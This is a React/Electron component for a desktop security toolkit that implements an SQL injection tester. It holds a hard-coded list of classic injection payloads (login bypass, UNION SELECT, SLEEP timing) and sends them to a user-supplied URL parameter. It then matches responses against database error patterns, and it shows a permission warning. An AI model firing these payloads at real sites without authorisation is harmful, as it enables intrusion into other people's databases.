import React, { useState } from 'react';
import { useStore } from '../../store/store';
import styles from './GalaxyTool.module.css';

const SQLInjectionTester: React.FC = () => {
  const { setActiveGalaxyTool, addToolResult } = useStore();
  const [url, setUrl] = useState('');
  const [parameter, setParameter] = useState('');
  const [results, setResults] = useState<string[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "' UNION SELECT NULL--",
    "1' ORDER BY 1--",
    "' AND 1=1--",
    "' AND 1=2--",
    "' OR SLEEP(5)--",
  ];

  const testSQL = async () => {
    if (!url.trim() || !parameter.trim()) {
      setError('URL and parameter are required');
      return;
    }

    setLoading(true);
    setError(null);
    setResults([]);

    try {
      const vulnerabilities: string[] = [];

      for (const payload of payloads) {
        const testUrl = `${url}?${parameter}=${encodeURIComponent(payload)}`;

        try {
          const response: any = await window.electronAPI.net.httpFetch(testUrl, { method: 'GET', timeout: 3000 });
          
          if (!response.success) continue;

          const text = response.data;

          // Check for common SQL error patterns
          const errorPatterns = [
            /sql syntax/i,
            /mysql_fetch/i,
            /pg_query/i,
            /sqlite_query/i,
            /ora-[0-9]{5}/i,
            /syntax error/i,
            /unclosed quotation/i,
          ];

          const hasError = errorPatterns.some((pattern) => pattern.test(text));

          if (hasError) {
            vulnerabilities.push(`Potential vulnerability with payload: ${payload}`);
          }
        } catch (err) {
          // Network error, continue
        }

        await new Promise((resolve) => setTimeout(resolve, 500));
      }

      if (vulnerabilities.length === 0) {
        vulnerabilities.push('No obvious SQL injection vulnerabilities detected');
      }

      setResults(vulnerabilities);

      addToolResult({
        id: Date.now().toString(),
        toolName: 'SQL Injection Tester',
        timestamp: Date.now(),
        input: { url, parameter },
        output: vulnerabilities,
        success: true,
      });
    } catch (err: unknown) {
      const errorMessage = err instanceof Error ? err.message : 'Test failed';
      setError(errorMessage);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className={styles.tool}>
      <div className={styles.toolHeader}>
        <button className={styles.backButton} onClick={() => setActiveGalaxyTool(null)}>
          ← Back
        </button>
        <h2 className={styles.toolTitle}>
          <span className={styles.toolIcon}>💉</span>
          SQL Injection Tester
        </h2>
      </div>

      <div className={styles.toolContent}>
        <div className={styles.requestSection}>
          <div className={styles.inputGroup}>
            <label className={styles.label}>Target URL</label>
            <input
              type="text"
              className={styles.input}
              placeholder="https://example.com/page.php"
              value={url}
              onChange={(e) => setUrl(e.target.value)}
            />
          </div>

          <div className={styles.inputGroup}>
            <label className={styles.label}>Parameter Name</label>
            <input
              type="text"
              className={styles.input}
              placeholder="id"
              value={parameter}
              onChange={(e) => setParameter(e.target.value)}
            />
          </div>

          <button className={styles.sendButton} onClick={testSQL} disabled={loading}>
            {loading ? 'Testing...' : 'Test SQL Injection'}
          </button>

          <div style={{ marginTop: 'var(--spacing-md)', padding: 'var(--spacing-sm)', background: 'rgba(255, 152, 0, 0.1)', border: '1px solid rgba(255, 152, 0, 0.3)', borderRadius: '6px', color: '#ff9800', fontSize: 'var(--font-size-xs)' }}>
            ⚠️ <strong>Warning:</strong> Only test on systems you own or have permission to test.
          </div>
        </div>

        {error && (
          <div className={styles.error}>
            <strong>Error:</strong> {error}
          </div>
        )}

        {loading && (
          <div className={styles.loading}>
            <div className={styles.spinner}></div>
            <span>Testing SQL injection vectors...</span>
          </div>
        )}

        {results.length > 0 && (
          <div className={styles.results}>
            <h3 className={styles.sectionTitle}>Test Results</h3>
            {results.map((result, index) => (
              <div key={index} className={styles.resultItem}>
                <span style={{ color: result.includes('vulnerability') ? '#ff9800' : '#4caf50' }}>{result}</span>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
};

export default SQLInjectionTester;
